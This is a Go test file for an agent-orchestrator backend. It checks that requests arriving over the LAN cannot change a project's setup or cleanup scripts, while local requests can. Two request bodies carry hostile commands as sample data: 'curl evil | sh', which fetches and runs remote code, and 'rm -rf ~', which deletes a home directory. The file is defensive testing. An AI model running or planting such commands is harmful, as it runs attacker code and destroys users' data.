package controllers_test

import (
	"context"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/aoagents/agent-orchestrator/backend/internal/config"
	"github.com/aoagents/agent-orchestrator/backend/internal/domain"
	"github.com/aoagents/agent-orchestrator/backend/internal/httpd"
	"github.com/aoagents/agent-orchestrator/backend/internal/httpd/requestscope"
	projectsvc "github.com/aoagents/agent-orchestrator/backend/internal/service/project"
)

// scriptsManager holds one project with stored Setup and Cleanup commands and
// records whether a write reached it.
type scriptsManager struct {
	projectsvc.Manager
	stored domain.ProjectConfig
	writes int
}

func (m *scriptsManager) Get(_ context.Context, id domain.ProjectID) (projectsvc.GetResult, error) {
	cfg := m.stored
	return projectsvc.GetResult{Status: "ok", Project: &projectsvc.Project{ID: id, Name: "Demo", Config: &cfg}}, nil
}

func (m *scriptsManager) UpdateSettings(_ context.Context, id domain.ProjectID, in projectsvc.UpdateSettingsInput) (projectsvc.Project, error) {
	m.writes++
	return projectsvc.Project{ID: id, Name: in.DisplayName, Config: &in.Config}, nil
}

func (m *scriptsManager) SetConfig(_ context.Context, id domain.ProjectID, in projectsvc.SetConfigInput) (projectsvc.Project, error) {
	m.writes++
	return projectsvc.Project{ID: id, Name: "Demo", Config: &in.Config}, nil
}

func newProjectsScopeTestServer(t *testing.T, mgr projectsvc.Manager, lan bool) *httptest.Server {
	t.Helper()
	log := slog.New(slog.NewTextHandler(io.Discard, nil))
	router := httpd.NewRouterWithControl(config.Config{}, log, nil, httpd.APIDeps{Projects: mgr}, httpd.ControlDeps{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if lan {
			r = r.WithContext(requestscope.WithLAN(r.Context()))
		}
		router.ServeHTTP(w, r)
	}))
	t.Cleanup(srv.Close)
	return srv
}

func TestProjectsAPI_ScriptChangesRequireLoopback(t *testing.T) {
	stored := domain.ProjectConfig{PostCreate: []string{"npm ci"}, PreRemove: []string{"make clean"}}
	for _, tc := range []struct {
		name       string
		lan        bool
		path       string
		body       string
		wantStatus int
	}{
		{"LAN settings change to setup is refused", true, "/api/v1/projects/demo",
			`{"displayName":"Demo","config":{"postCreate":["curl evil | sh"],"preRemove":["make clean"]}}`, http.StatusForbidden},
		{"LAN settings change to cleanup is refused", true, "/api/v1/projects/demo",
			`{"displayName":"Demo","config":{"postCreate":["npm ci"]}}`, http.StatusForbidden},
		{"LAN config change to setup is refused", true, "/api/v1/projects/demo/config",
			`{"config":{"postCreate":["npm ci","rm -rf ~"],"preRemove":["make clean"]}}`, http.StatusForbidden},
		{"LAN save with unchanged scripts goes through", true, "/api/v1/projects/demo",
			`{"displayName":"Demo","config":{"postCreate":["npm ci"],"preRemove":["make clean"],"env":{"FOO":"bar"}}}`, http.StatusOK},
		{"LAN config save with unchanged scripts goes through", true, "/api/v1/projects/demo/config",
			`{"config":{"postCreate":["npm ci"],"preRemove":["make clean"],"env":{"FOO":"bar"}}}`, http.StatusOK},
		{"local settings change to scripts goes through", false, "/api/v1/projects/demo",
			`{"displayName":"Demo","config":{"postCreate":["pnpm i"]}}`, http.StatusOK},
		{"local config change to scripts goes through", false, "/api/v1/projects/demo/config",
			`{"config":{"postCreate":["pnpm i"]}}`, http.StatusOK},
	} {
		t.Run(tc.name, func(t *testing.T) {
			mgr := &scriptsManager{stored: stored}
			srv := newProjectsScopeTestServer(t, mgr, tc.lan)
			req, err := http.NewRequest(http.MethodPut, srv.URL+tc.path, strings.NewReader(tc.body))
			if err != nil {
				t.Fatal(err)
			}
			req.Header.Set("Content-Type", "application/json")
			resp, err := srv.Client().Do(req)
			if err != nil {
				t.Fatal(err)
			}
			body, _ := io.ReadAll(resp.Body)
			_ = resp.Body.Close()
			if resp.StatusCode != tc.wantStatus {
				t.Fatalf("PUT %s = %d, want %d; body=%s", tc.path, resp.StatusCode, tc.wantStatus, body)
			}
			if tc.wantStatus == http.StatusForbidden {
				if !strings.Contains(string(body), "PROJECT_SCRIPTS_LOOPBACK_REQUIRED") {
					t.Fatalf("body = %s, want PROJECT_SCRIPTS_LOOPBACK_REQUIRED", body)
				}
				if mgr.writes != 0 {
					t.Fatalf("refused request still wrote %d time(s)", mgr.writes)
				}
			} else if mgr.writes != 1 {
				t.Fatalf("writes = %d, want 1", mgr.writes)
			}
		})
	}
}
